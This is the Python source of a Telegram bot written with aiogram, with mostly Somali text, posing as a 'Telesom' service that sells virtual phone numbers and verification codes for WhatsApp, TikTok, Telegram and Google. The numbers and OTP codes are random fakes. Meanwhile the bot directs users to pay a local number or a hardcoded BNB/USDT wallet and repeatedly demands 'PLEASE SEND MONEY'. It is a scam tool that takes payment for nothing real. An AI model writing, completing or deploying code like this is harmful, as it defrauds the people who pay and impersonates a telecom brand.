import os, random, asyncio
from aiogram import Bot, Dispatcher, F, types
from aiogram.types import *
from aiogram.filters import Command
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State

# ===== CONFIG =====
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 7983838654

bot = Bot(BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# ===== STORAGE =====
users = {}        # User data
pending_admin = {}  # Admin pending

# ===== STATES =====
class UserState(StatesGroup):
    waiting_name = State()
    waiting_age = State()
    waiting_photo = State()
    waiting_code_check = State()
    waiting_screenshot = State()

# ===== HELPERS =====
def random_number():
    return "63" + "".join(str(random.randint(0,9)) for _ in range(7))

def vip_number():
    # VIP numbers pattern
    return "63" + "".join(str(random.choice([4,5])) + str(random.randint(0,9)) for _ in range(7))

def service_code(service):
    codes = {
        "whatsapp": lambda: "".join(random.choices("0123456789", k=6)),
        "tiktok": lambda: "TT" + "".join(random.choices("0123456789", k=5)),
        "telegram": lambda: "TG" + "".join(random.choices("0123456789", k=5)),
        "google": lambda: "G-" + "".join(random.choices("0123456789", k=8)),
        "card": lambda: "".join(random.choices("0123456789", k=6))
    }
    return codes.get(service, lambda: "".join(random.choices("0123456789", k=6)))()

async def animation(msg, text, sec=5):
    for i in range(sec):
        dots = "." * ((i%3)+1)
        await asyncio.sleep(1)
        await msg.edit_text(f"{text}{dots}")

# ===== START =====
@dp.message(Command("start"))
async def start(msg: types.Message):
    kb = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton("New Order"), KeyboardButton("Check Code")]],
        resize_keyboard=True
    )
    await msg.answer("Ku soo dhawoow Telesom Bot", reply_markup=kb)

# ===== NEW ORDER =====
@dp.message(lambda m: m.text == "New Order")
async def new_order(msg: types.Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("VIRTUAL", callback_data="virtual")],
        [InlineKeyboardButton("CARD", callback_data="card")]
    ])
    await msg.answer("Dooro nooca order-ka:", reply_markup=kb)

# ===== VIRTUAL =====
@dp.callback_query(F.data=="virtual")
async def virtual(call: types.CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("WHATSAPP", callback_data="whatsapp")],
        [InlineKeyboardButton("TIKTOK", callback_data="tiktok")],
        [InlineKeyboardButton("TELEGRAM", callback_data="telegram")],
        [InlineKeyboardButton("GOOGLE", callback_data="google")]
    ])
    await call.message.edit_text("Dooro Platform:", reply_markup=kb)

@dp.callback_query(F.data.in_(["whatsapp","tiktok","telegram","google"]))
async def platform_selected(call: types.CallbackQuery):
    platform = call.data
    number = random_number()
    users[call.from_user.id] = {"platform": platform, "number": number}
    msg = await call.message.edit_text("Searching Number")
    await animation(msg, "Searching Number", 5)
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("LOCAL", callback_data="v_local")],
        [InlineKeyboardButton("CRYPTO", callback_data="v_crypto")]
    ])
    await msg.edit_text(
        f"Number: +252{number}\nDir Lacagta si aad u hesho OTP.",
        reply_markup=kb
    )

# Virtual Local
@dp.callback_query(F.data=="v_local")
async def virtual_local(call: types.CallbackQuery):
    user = users[call.from_user.id]
    user["payment_type"] = "local"
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("CONFIRM", callback_data="v_confirm")],
        [InlineKeyboardButton("CANCEL", callback_data="cancel")]
    ])
    await call.message.edit_text(f"Local Payment Number: +252{user['number']}\nCONFIRM markuu payment dhameeyo.", reply_markup=kb)

# Virtual Crypto
@dp.callback_query(F.data=="v_crypto")
async def virtual_crypto(call: types.CallbackQuery):
    user = users[call.from_user.id]
    user["payment_type"] = "crypto"
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("BNB: 0x98ff…7ac", callback_data="copy_bnb")],
        [InlineKeyboardButton("USDT-BEP20: 0x98ff…7ac", callback_data="copy_usdt")],
        [InlineKeyboardButton("CONFIRM", callback_data="v_confirm")],
        [InlineKeyboardButton("CANCEL", callback_data="cancel")]
    ])
    await call.message.edit_text("Crypto Payment: Copy address and CONFIRM.", reply_markup=kb)

# Copy addresses
@dp.callback_query(F.data.in_(["copy_bnb","copy_usdt"]))
async def copy_address(call: types.CallbackQuery):
    addr = {
        "copy_bnb": "0x98ffcb29a4fc182d461ebdba54648d8fe24597ac",
        "copy_usdt": "0x98ffcb29a4fc182d461ebdba54648d8fe24597ac"
    }[call.data]
    await call.answer(f"Copied: {addr}", show_alert=True)

# Virtual Confirm
@dp.callback_query(F.data=="v_confirm")
async def virtual_confirm(call: types.CallbackQuery):
    user = users[call.from_user.id]
    code = service_code(user["platform"])
    user["code"] = code
    pending_admin[call.from_user.id] = True
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("APPROVE", callback_data=f"admin_ok_{call.from_user.id}")]
    ])
    await bot.send_message(ADMIN_ID, f"New Virtual Payment Request\nUser:{call.from_user.id}\nPlatform:{user['platform']}\nNumber:{user['number']}\nCode:{code}", reply_markup=kb)
    await asyncio.sleep(10)
    if pending_admin.get(call.from_user.id):
        await call.message.answer("PLEASE SEND MONEY 💵")

# ===== CARD FLOW =====
@dp.callback_query(F.data=="card")
async def card_menu(call: types.CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("VIP", callback_data="vip")],
        [InlineKeyboardButton("NORMAL", callback_data="normal")]
    ])
    await call.message.edit_text("Dooro Card Type:", reply_markup=kb)

@dp.callback_query(F.data.in_(["vip","normal"]))
async def card_selected(call: CallbackQuery):
    card_type = call.data
    number = vip_number() if card_type=="vip" else random_number()
    users[call.from_user.id] = {"card": card_type, "number": number}
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("LOCAL", callback_data="card_local")],
        [InlineKeyboardButton("CRYPTO", callback_data="card_crypto")]
    ])
    await call.message.edit_text(f"{card_type} selected. Door nooca payment-ka:", reply_markup=kb)

@dp.callback_query(F.data=="card_local")
async def card_local(call: CallbackQuery):
    user = users[call.from_user.id]
    user["payment_type"] = "local"
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("CONFIRM", callback_data="card_confirm")],
        [InlineKeyboardButton("CANCEL", callback_data="cancel")]
    ])
    await call.message.edit_text(f"Local Payment Number: +252{user['number']}", reply_markup=kb)

@dp.callback_query(F.data=="card_crypto")
async def card_crypto(call: CallbackQuery):
    user = users[call.from_user.id]
    user["payment_type"] = "crypto"
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("BNB: 0x98ff…7ac", callback_data="copy_bnb")],
        [InlineKeyboardButton("USDT-BEP20: 0x98ff…7ac", callback_data="copy_usdt")],
        [InlineKeyboardButton("CONFIRM", callback_data="card_confirm")],
        [InlineKeyboardButton("CANCEL", callback_data="cancel")]
    ])
    await call.message.edit_text("Crypto Payment: Copy address and CONFIRM.", reply_markup=kb)

# Card confirm
@dp.callback_query(F.data=="card_confirm")
async def card_confirm(call: CallbackQuery):
    await call.message.edit_text("Fadlan soo dir screenshot ka lacag bixintaada si admin u xaqiijiyo.")
    await dp.current_state(user=call.from_user.id).set_state(UserState.waiting_screenshot)

# ===== ADMIN APPROVE =====
@dp.callback_query(F.data.startswith("admin_ok_"))
async def admin_approve(call: CallbackQuery):
    uid = int(call.data.split("_")[-1])
    if uid in users:
        pending_admin[uid] = False
        await bot.send_message(uid, f"Payment Confirmed ✅\nOTP Code: {users[uid].get('code','Not Set')}")
        await call.message.edit_text("Approved ✅")

# ===== CANCEL =====
@dp.callback_query(F.data=="cancel")
async def cancel(call: CallbackQuery):
    await call.message.edit_text("Order Cancelled ❌")

# ===== CHECK CODE =====
@dp.message(lambda m: m.text=="Check Code")
async def check_code(msg: types.Message):
    user = users.get(msg.from_user.id)
    if not user or "code" not in user:
        return await msg.answer("Ma jiro code la heli karo ❌")
    await msg.answer("Gali code-kaaga:")
    await dp.current_state(user=msg.from_user.id).set_state(UserState.waiting_code_check)

@dp.message(UserState.waiting_code_check)
async def check_code_input(msg: types.Message, state: FSMContext):
    user = users.get(msg.from_user.id)
    if user and user.get("code") == msg.text.strip():
        await msg.answer(f"Code Confirmed ✅\nNumber: +252{user['number']}")
    else:
        await msg.answer("Code invalid ❌")
    await state.clear()


# ===== RUN BOT =====
async def main():
    await dp.start_polling(bot)

if __name__=="__main__":
    import logging
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())
